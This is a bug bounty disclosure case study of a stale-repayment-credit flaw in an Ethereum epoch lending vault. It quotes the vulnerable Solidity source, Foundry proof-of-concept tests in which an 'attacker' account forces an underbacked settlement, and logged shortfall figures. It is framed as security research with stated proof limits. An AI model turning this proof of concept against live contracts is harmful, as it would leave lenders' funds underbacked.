# Based on deployed contracts

Project: Anonymous epoch lending project (LEND-01)  
Category: Epoch lending  
Severity: Critical author recommendation; conflicting High/potential Critical source descriptions  
Engagement: Bug bounty hunting  
Chain: Ethereum; local mainnet fork pinned at block 24,950,298  
Tech stack: Solidity/EVM, Foundry, WETH/wstETH, Ajna lending, Lido withdrawal queue, Chainlink and upkeep settlement  
Evidence: Historical local or fork test excerpts; scope and fixture assumptions are described below  
Remediation: Not independently verified  
Contribution: Research and disclosure case study; exclusive discovery credit is not asserted  
Proof availability: Excerpts and source references; the original harness and dependencies are not distributed.

# Stale repayment credit permits an underfunded later epoch to settle

## Description

A prior bailout increments global totalManualRepay. That credit survives closing and withdrawing the real backing from the earlier epoch. A later close uses claimAmount plus that stale credit as coverage, succeeds with insufficient WETH, and records a lender entitlement that the vault cannot pay.

The paired minimal reproductions a 0.011321350055880746 WETH shortfall, approximately 26.92 USD at its stated historical price. An older escalation trace differs by two wei; this document uses the later minimal receipt. The test mocks a finalized Lido claim below close-time debt and refreshes oracle values locally. The example establishes underbacked settlement and an all-or-nothing withdrawal failure, not a measured large-scale drain. Severity remains disputed between the author’s Critical escalation and later High/potential-Critical prose.

### Mechanism step by step

#### Step 1 — Record manual repayment in one global counter

Any rescuer can pay debt and increment totalManualRepay. This counter is not scoped to the paying account or a particular epoch in this entry point.

Source: `src/LVLidoVault.sol:1084-1100`

```solidity
    function repayAjnaDebt(uint256 quoteTokenAmount) external lock {
        // Prevent zero-value transactions to save gas
        if (quoteTokenAmount == 0) {
            revert VaultLib.InvalidInput();
        }

        // Update state first
        totalManualRepay += quoteTokenAmount;

        // Perform external calls last
        if (
            !IERC20(VaultLib.QUOTE_TOKEN).transferFrom(msg.sender, address(this), quoteTokenAmount)
                || !testQuoteToken.mint(address(this), quoteTokenAmount)
                || !IERC20(address(testQuoteToken)).approve(address(pool), quoteTokenAmount)
        ) {
            revert VaultLib.TokenOperationFailed();
        }
```

#### Step 2 — Treat surviving credit as currently available coverage

Close accepts actualDebt<=claimAmount+totalManualRepay and deducts the gap, but computes lender obligations using actualDebt rather than proving the resulting WETH backing.

Source: `src/LVLidoVaultUpkeeper.sol:204-229`

```solidity
    function _processDebtAndCalculateOwed(
        uint256 t1Debt,
        uint256 actualDebt,
        uint256 claimAmount,
        IERC20Pool pool
    ) internal returns (uint256 matchedLendersOwed) {
        if (actualDebt > claimAmount + LVLidoVault.totalManualRepay()) {
            revert DebtGreaterThanAvailableFunds();
        } else {
            if (actualDebt < claimAmount) {
                LVLidoVault.wethToWsteth(claimAmount - actualDebt);
            } else {
                LVLidoVault.setTotalManualRepay(LVLidoVault.totalManualRepay() - (actualDebt - claimAmount));
            }
        }

        if (actualDebt > 0) {
            bool mintSuccess = LVLidoVault.mintForProxy(address(LVLidoVault.testQuoteToken()), address(LVLidoVault), t1Debt);
            bool approveSuccess = LVLidoVault.approveForProxy(address(LVLidoVault.testQuoteToken()), address(pool), t1Debt);
            if (!mintSuccess || !approveSuccess) revert UpkeepFailed();

            matchedLendersOwed = LVLidoVault.totalLenderQTUtilized() - LVLidoVault.totalBorrowAmount() + actualDebt;
        } else {
            matchedLendersOwed = IERC20(VaultLib.QUOTE_TOKEN).balanceOf(address(LVLidoVault))
                - LVLidoVault.totalLenderQTUnutilized();
        }
```

#### Step 3 — Observe a successful close followed by failed withdrawal

The test checks exact stale-credit consumption, a closed epoch, positive lender shortfall and failure of withdrawLenderOrder. These are historical test assertions; the measured values come from the cited receipt.

Source: `test/submission/P2_StaleCreditConsumption.t.sol:123-140`

```solidity
        _expectTask(2);
        vm.prank(attacker); util.performTask();
        uint256 staleAfterClose = vault.totalManualRepay();
        uint256 vaultWeth = IERC20(WETH).balanceOf(address(vault));
        uint256 shortfall = lenderEntitlement - vaultWeth;
        assertEq(staleBeforeClose - staleAfterClose, gap, "close did not consume stale credit exactly");
        assertFalse(vault.epochStarted(), "epoch2 did not close");
        assertGt(shortfall, 0, "close left no lender shortfall");
        console2.log("vault WETH after close", vaultWeth);
        console2.log("lender entitlement", lenderEntitlement);
        console2.log("shortfall WETH", shortfall);
        console2.log("shortfall USD cents", (shortfall * ETH_USD_1E2) / 1 ether);

        // PHASE 6: lender attempts withdrawal — all-or-nothing withdrawal fails because quote backing is short
        vm.prank(lender);
        (bool ok, bytes memory data) = address(vault).call(abi.encodeWithSelector(vault.withdrawLenderOrder.selector));
        assertFalse(ok, "underbacked lender withdrawal unexpectedly succeeded");
        assertEq(data.length, 0, "expected raw WETH balance revert");
```

## Proof of concept

The paired Foundry tests compare an epoch without stale credit against one carrying repayment credit from an earlier epoch. The control rejects the deficient claim with DebtGreaterThanAvailableFunds. The candidate creates earlier credit, removes its cash backing, starts another epoch and mocks a deficient Lido payout; settlement then succeeds while the lender withdrawal is underbacked. Historical balances are 10.007301918119701049 WETH available versus 10.018623268175581795 owed. Synthetic funding, owner setup and time changes are fixture prerequisites.

**Proof limits:** Mocked claim payout and locally constructed cross-epoch history; not a production loss measurement.

The excerpts below preserve historical assertions and recorded outcomes; they are not a fresh execution result.

## Relevant test excerpts

Source: `test/submission/P2_StaleCreditConsumption.t.sol:66-83`

```solidity
    function test_withoutStaleCredit_closeRevertsWhenActualDebtExceedsClaim() public {
        // PHASE 1: epoch 2 setup
        _startBalancedEpoch();
        (uint256 claimAmount, uint256 actualDebt,,) = _queueEpochFundsWithLowRate();
        assertEq(vault.totalManualRepay(), 0, "baseline should have no stale credit");

        // PHASE 2: drive epoch 2 to actualDebt > claimAmount
        _mockShortClaim(claimAmount);
        assertGt(actualDebt, claimAmount, "baseline gap missing");
        _expectTask(2);
        console2.log("baseline claimAmount", claimAmount);
        console2.log("baseline actualDebt", actualDebt);

        // PHASE 3: attempt close — must revert without stale credit
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(DebtGreaterThanAvailableFunds.selector));
        util.performTask();
    }
```

Source: `test/submission/P2_StaleCreditConsumption.t.sol:109-140`

```solidity
        vm.warp(vault.lastEpochEnd() + vault.epochCoolDownPeriod() + 1);
        _startBalancedEpoch();

        // PHASE 4: drive epoch 2 to actualDebt > claimAmount state
        (uint256 claimAmount, uint256 actualDebt, uint256 staleBeforeClose, uint256 lenderEntitlement) = _queueEpochFundsWithLowRate();
        _mockShortClaim(claimAmount);
        uint256 gap = actualDebt - claimAmount;
        assertEq(staleBeforeClose, staleCredit, "stale credit changed before close");
        assertEq(staleBeforeClose - gap, staleCredit - gap, "gap arithmetic drift");
        console2.log("claimAmount", claimAmount);
        console2.log("actualDebt", actualDebt);
        console2.log("stale gap consumed", gap);

        // PHASE 5: close succeeds only because stale credit fills the gap
        _expectTask(2);
        vm.prank(attacker); util.performTask();
        uint256 staleAfterClose = vault.totalManualRepay();
        uint256 vaultWeth = IERC20(WETH).balanceOf(address(vault));
        uint256 shortfall = lenderEntitlement - vaultWeth;
        assertEq(staleBeforeClose - staleAfterClose, gap, "close did not consume stale credit exactly");
        assertFalse(vault.epochStarted(), "epoch2 did not close");
        assertGt(shortfall, 0, "close left no lender shortfall");
        console2.log("vault WETH after close", vaultWeth);
        console2.log("lender entitlement", lenderEntitlement);
        console2.log("shortfall WETH", shortfall);
        console2.log("shortfall USD cents", (shortfall * ETH_USD_1E2) / 1 ether);

        // PHASE 6: lender attempts withdrawal — all-or-nothing withdrawal fails because quote backing is short
        vm.prank(lender);
        (bool ok, bytes memory data) = address(vault).call(abi.encodeWithSelector(vault.withdrawLenderOrder.selector));
        assertFalse(ok, "underbacked lender withdrawal unexpectedly succeeded");
        assertEq(data.length, 0, "expected raw WETH balance revert");
```

Source: `submission/P2_minimal_repro.md:40-53`

````text
baseline actualDebt 9763737289183856538

stale credit carried in 9752919990002398984
claimAmount 9752365124667112268
actualDebt 9763752384312034116
stale gap consumed 11387259644921848
vault WETH after close 10007301918119701049
lender entitlement 10018623268175581795
shortfall WETH 11321350055880746
shortfall USD cents 2692
```

## Phase map

````
